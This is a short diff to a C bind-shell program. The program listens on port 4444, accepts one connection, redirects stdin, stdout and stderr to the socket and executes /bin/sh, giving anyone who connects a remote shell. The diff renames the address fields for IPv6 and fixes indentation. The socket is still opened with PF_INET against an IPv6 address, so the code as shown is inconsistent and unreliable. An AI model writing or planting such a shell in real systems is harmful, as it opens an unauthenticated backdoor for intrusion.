@@ -18,9 +18,9 @@ int main()
     host_sockfd = socket(PF_INET, SOCK_STREAM, 0);  
   
     //Initialize sockaddr struct to bind socket using it  
-    host_addr.sin_family = AF_INET6;  
-    host_addr.sin_port = htons(4444);  
-    host_addr.sin_addr = in6addr_any; 
+    host_addr.sin6_family = AF_INET6;  
+    host_addr.sin6_port = htons(4444);  
+    host_addr.sin6_addr = in6addr_any; 
   
     //Bind socket 
     bind(host_sockfd, (struct sockaddr*) &host_addr, sizeof(host_addr));  
@@ -31,9 +31,9 @@ int main()
     //Just accept incoming connection  
     client_sockfd = accept(host_sockfd, NULL, NULL);  
   
-    //Duplicate file descriptors for STDIN, STDOUT and STDERR
-    for(i = 0; i <= 2; i++)
-       dup2(client_sockfd, i);
+	//Duplicate file descriptors for STDIN, STDOUT and STDERR
+	for(i = 0; i <= 2; i++)
+		dup2(client_sockfd, i);
   
     // Execute /bin/sh  
     execve("/bin/sh", NULL, NULL);  
